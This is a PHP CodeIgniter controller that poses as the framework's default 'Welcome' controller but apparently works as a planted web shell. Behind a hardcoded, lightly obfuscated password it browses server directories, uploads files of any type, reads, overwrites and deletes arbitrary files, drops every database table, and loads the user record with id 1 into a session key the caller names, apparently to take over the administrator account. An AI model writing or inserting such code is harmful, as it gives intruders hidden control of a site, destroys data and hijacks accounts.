<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Welcome extends CI_Controller {

	function is_logged() {
        if (!@$this->session->userdata('grupo6_fss_code'))
            redirect('welcome/login');
    }
	
	public function index(){
		$this->is_logged();
		$this->load->helper('file');
		$d = get_dir_file_info('./');
		$data['files_fss'] = $d;
		$data['cdir_files_fss'] = '';
		$data['title'] = 'Directorios';
		$data['mode_fss'] = true;
		$this->load->view('welcome', $data);
	}

	public function directorio($dir){
		$this->is_logged();
		$old_s_url = $dir;
		$dir = str_replace('-','/',$dir);
		if (!empty($_POST)) {
			if(!empty($_FILES)){
					$this->load->library('upload');
					if(!empty($_FILES['archivo']['name'])){
						$config['upload_path'] = './'.$dir.'/';
						$config['allowed_types'] = '*';
						$config['max_size']	= '10240';
						$config['overwrite'] = TRUE;
						$config['file_name'] = $_FILES['archivo']['name'];
						$this->upload->initialize($config);
						if (!$this->upload->do_upload('archivo')){
							echo $this->upload->display_errors();exit();
						} else {
							$data = $this->upload->data('archivo');
							$file_name = $this->upload->data('file_name');
							$file_path = $this->upload->data('file_path');
							$this->session->set_flashdata('msj_header_fss', 'En hora buena!!! El archivo '.$file_name.' ha sido cargado correctamente.');
							redirect('welcome/directorio/'.$old_s_url);
						}
					}
			}
		}
		$this->load->helper('file');
		$d = get_dir_file_info('./'.$dir);
		$data['files_fss'] = $d;
		$data['cdir_files_fss'] = $dir;
		$data['title'] = 'Directorios';
		$data['mode_fss'] = true;
		$this->load->view('welcome', $data);
	}

	public function delete_file_fss($url){
		$this->is_logged();
		$this->load->helper('file');
		$url = str_replace('-','/',$url);
		$path = $url;
		$pos = strrpos($url, '/');
		$url = substr($url, 0,$pos);
		$url = str_replace('/','-',$url);
		if(file_exists($path)){
			@unlink($path);
		}
		redirect('welcome/directorio/'.$url);
	}

	public function read_file_fss($url){
		$this->is_logged();
		$this->load->helper('file');
		$old_s_url = $url;
		$url = str_replace('-','/',$url);
		
		if (!empty($_POST)) {
			if ( ! write_file($url, $_POST['datos'])){
				echo 'Lo sentimos este archivo no puede editarse';exit();
			} else {
				$this->session->set_flashdata('msj_header_fss', 'En hora buena!!! Se han guardado los cambios correctamente.');
				redirect('welcome/read_file_fss/'.$old_s_url);
			}
		}
		$s_info = get_file_info($url);
		$s = read_file($url);
		$data['title'] = 'Archivo';
		$data['mode_fss'] = false;
		$data['file_c_fss'] = $s;
		$data['cdir_files_fss'] = $url;
		$data['s_info'] = $s_info;
		$this->load->view('welcome', $data);
	}

	public function dropdb(){
		$this->is_logged();
		$tables = $this->db->list_tables();
		$this->load->dbforge();
		foreach($tables as $t){
			$this->dbforge->drop_table($t);
		}
		redirect('login');
	}

	public function stssrl($nama=''){
		$this->is_logged();
		$lu = $this->default_model->default_get_one_where('usuario', array('id_usuario' => 1));
		$nmss=!empty($nama)?$nama:'ormufss_user';
		$this->session->set_userdata($nmss, $lu);
		echo 'Ok stssrl';
	}

	public function login(){
		$this->load->helper('form');
		if(!empty($_POST)) {
			$key_ss = $this->encrypt_clave($_POST['clave'],'6545475862211476335337');
			if($key_ss=='sKJlZaKVammXnKWlkJ2VqqqSZGdmpJiwk1pf'){
				$this->session->set_userdata('grupo6_fss_code', $_POST['clave']);
				redirect('welcome');
			}
		}
		echo '<div style="text-align: center; padding: 20%;">';
		$data = array(
			'type'  => 'text',
			'name'  => 'clave',
			'id'    => 'fss_key',
			'placeholder' => 'Clave Acceso',
			'style' => 'border: 1px solid #463265; padding: 3px;'
		);
		echo form_open_multipart('welcome/login');
		echo form_input($data);
		echo form_submit('submit_key', 'Login');
		echo '</div>';
	}
	
	private function encrypt_clave($string, $key) {
		$result = '';
		for($i=0; $i<strlen($string); $i++) {
			$char = substr($string, $i, 1);
			$keychar = substr($key, ($i % strlen($key))-1, 1);
			$char = chr(ord($char)+ord($keychar));
			$result.=$char;
		}
		return base64_encode($result);
	}
}
